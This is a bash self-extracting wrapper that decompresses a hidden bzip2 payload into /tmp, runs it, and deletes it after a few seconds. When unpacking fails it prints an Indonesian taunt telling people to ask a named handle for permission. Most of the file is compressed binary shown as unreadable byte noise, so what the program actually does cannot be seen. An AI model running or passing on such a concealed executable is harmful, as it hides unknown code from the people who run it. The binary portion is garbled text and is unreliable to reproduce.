#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYH�� ��E�@ ���?�������@�D@0  `����㮴3��� A�hT���dѠ��4��i�4H6�� 42i�M �&��@  ɐ�� �h       � ��j��T�&�4��b1 �2��1(I��<��i���  �@  P!0�OP�?T��zL44@Sd��h��HzI�$�<�ϔB�QN�6�Z�y�7	ΰ�6�b�!�)�`9 ��4���x�)Z��Ә;�C��d8�J��w	�58L�֦�S@�����acR��$53���I��i]�%�v�ٲV�M�e�J ��ɽ�1C��Q�~�������v5�1��+]-�Z1.9����a~���Q{���Epi�[�U��U��0��ǫ�@      /jj\��w�Fd|����u��������y�*ӡ� B�\�XW���h�VY.݄!B�	�Ȳ�KJ�
�BBBC5PHHj:�d�/�z�4�qp��j��Y�&Lr܏iG�����9!Q�P�`�(����^@��+�X}Ts��.<YK���yC^���f��K�}!���aaF��:��E�4O��VX!��lEj�
��#����$���6���1��s����HSsC�z�s��Un�W�%#M�����ܞ�`U���B�!B92��UJ���+ag3EFdh�HHHLH����]�� �*�˹��3 �����o_yy�Lp�/;�����c곹��a.M�BA�$YG�͘/�F|'����O�) ��N�� b3�]���9Ef���2Z+�X+�M����+x���q���;f�2��[|�O��u�&��~}�^�크ܠ(u	��37c�qsD1D��J��� � $勾(t�}@�? �NK���m���b&Ōl$���JcƝZt�_I$�6��WK�qZ+H����M�]���@�L~�q��Z^��2��5��r�4h�p3}o�'a6�NHBrRT�d+[J���=�K���~�/]!�������<�A���$���©�[*��8���"  P{�W����d�R�ԇxW�W��+�5�$�~�!���w�+p�k�<]@pNn[����#`H!�9	ɼ �
�:�:�\��]Q��nن��M�pn��}�0�Z�sbc4UQg5�>����Vǃ[��1�c�1�c���c�Y��D XW6�xw�Q���u��!d*���5�K�		�wp��W�$�\�cp<�äy�\v���
*����:���(����0�UB�R��
�Na�w���j��G��2�$!���:QY�z�����ɶk��{��E���[�\����nsw�'�d$�4��U�m���q�� ��ݽ���X9��7#a��B¸���4��`��qGG7^4�j�+��<8������1�p��I+�=
��FI$�9�V�6zJH9m�*��y�j�Ԩq2�nE�V��I$�$�N�EghWW�42i��Ql��iț\��0x���� >��s���z���I'�.�p� ��3�